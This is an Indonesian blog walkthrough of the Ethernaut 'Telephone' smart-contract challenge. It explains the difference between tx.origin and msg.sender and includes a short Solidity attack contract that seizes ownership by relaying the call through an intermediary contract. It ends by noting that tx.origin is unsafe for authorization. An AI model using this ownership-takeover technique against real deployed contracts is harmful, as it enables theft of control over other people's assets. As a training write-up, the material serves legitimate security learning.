---
title: "Level 4 - Telephone"
date: 2023-09-10T12:47:54+07:00
draft: false
tags: ["Ethernaut"]
categories: ["Smart Contract Securiy"]
---

Pada level kali ini kita diberikan source code smart contractnya seperti berikut

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

> **Goals** : Mendapatkan `ownership` dari contract level ini

### Breaking the code

Pada smart contract ini hanya terdapat satu function saja yaitu `changeOwner(_owner)`

```solidity
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```

Jika kita perhatikan code di atas untuk `changeOwner` terdapat pengecekkan, jika `tx.origin != msg.sender` maka kita bisa ganti ownership contractnya.

### Explainoit (Explain & Exploit)

`tx.origin` adalah global variabel dalam Solidity yang **_mengembalikan alamat akun yang mengirimkan transaksi_** (sender of the transaction). Jika kita gambarkan maksud dari ini adalah

```
Alice -> telephone.changeOwner()
tx.origin = Alice
msg.sender = Alice
```

Jadi Alice akan memanggil function `changeOwner` dan di dalam function `changeOwner` terdapat `tx.origin` & `msg.sender` yang mempunyai nilai yang sama yaitu Alice

Perbedaannya adalah ketika terjadi pemanggilan chain function maka nilai dari `tx.origin` & `msg.sender` akan berbeda. Berikut jika kita gambarkan lagi

```
Alice -> ContractAttack.something -> Telephone.changeOwner
msg.sender = address(ContractAttack)
tx.origin = Alice
```

Jadi Alice akan memanggil `ContractAttack.something` selanjutnya yaitu `Telephone.changeOwner` maka nantinya `msg.sender` ini mempunyai nilai _address_ dari _ContractAttack_ dan `tx.origin` bukan _address_ dari _ContractAttack_ melainkan Alice.

{{< figure align=center src="/images/20230910/Untitled.png" title="tx.origin vs msg.sender" >}}

> [Infographic Source](https://davidkathoh.medium.com/tx-origin-vs-msg-sender-93db7f234cb9)

Intinya adalah ketika seseorang memanggil ContractA atau ContractB dan akhirnya memanggil ContractTelephone, maka `tx.origin` akan bernilai address **pertama kali** yang memulai transaksi dan `msg.sender` akan bernilai address contract **terakhir** yang dipanggil

Dari penjelasan ini kita akan membuat sebuah malicious contract atau `Attack.sol` yang nantinya akan mengakses `Telephone.changeOwner()` agar dapat mengubah ownership dari contractnya menggunakan Remix IDE.

Seperti level sebelumnya, buat sebuah folder bernama `4_Telephone` dan didalamnya terdapat 2 file yaitu `Telephone.sol` dan `Attack.sol`. Untuk `Telephone.sol` cukup masukkan saja smart contract yang dikasih dan untuk `Attack.sol` seperti berikut

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Telephone.sol';

contract Attack{
    Telephone telephone = Telephone(**INSTANCE-ADDRESS**);

    function change() public {
        telephone.changeOwner(msg.sender);
    }
}
```

Ganti `INSTANCE-ADDRESS` dengan instance address yang sudah diberikan ketika start instance. Compile `Attack.sol` , ganti Environment di Deploy menjadi `Injected Provider - Metamask` dan Deploy contract `Attack.sol`

Klik tombol `change` , lalu pada browser cek apakah ownership contractnya sudah berubah atau belum. Jika sudah Submit instance dan selesai level ini

{{< figure align=center src="/images/20230910/Untitled 1.png" title="Contract address berubah" >}}

Sebenarnya jika kalian search `tx.origin` ini banyak yang bilang vulnerable terhadap _phising attacks_ (Source: [Solidity by Example](https://solidity-by-example.org/hacks/phishing-with-tx-origin/)). Jadi `tx.origin` ini tidak cocok untuk authorization ownership.

{{< figure align=center src="/images/20230910/Untitled 2.png" title="Penjelasan kerentanan ini dapat digunakan phising pada Ethernaut" >}}
